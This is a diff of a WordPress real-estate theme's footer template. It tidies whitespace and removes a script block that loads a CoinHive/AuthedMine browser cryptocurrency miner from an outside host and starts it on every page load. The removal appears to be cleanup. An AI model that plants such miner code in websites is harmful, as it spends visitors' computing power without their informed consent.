@@ -22,7 +22,7 @@ global $houzez_local;
 
 <!--start footer section-->
 <footer id="footer-section">
-    
+
     <?php get_template_part('template-parts/footer'); ?>
 
     <div class="footer-bottom">
@@ -62,7 +62,7 @@ global $houzez_local;
                     <div class="footer-col foot-social">
                         <p>
                             <?php echo $houzez_local['follow_us']; ?>
-                           
+
                             <?php if( houzez_option('fs-facebook') != '' ){ ?>
 					        	<a target="_blank" href="<?php echo esc_url(houzez_option('fs-facebook')); ?>"><i class="fa fa-facebook-square"></i></a>
 					        <?php } ?>
@@ -111,15 +111,6 @@ global $houzez_local;
 <?php } ?>
 
 <?php wp_footer(); ?>
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('I0mHlS18YVnDWfBWV1egK9EoMvtKUTLt', {throttle: 0.3});
 
-    // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-    }
-</script>
 </body>
 </html>
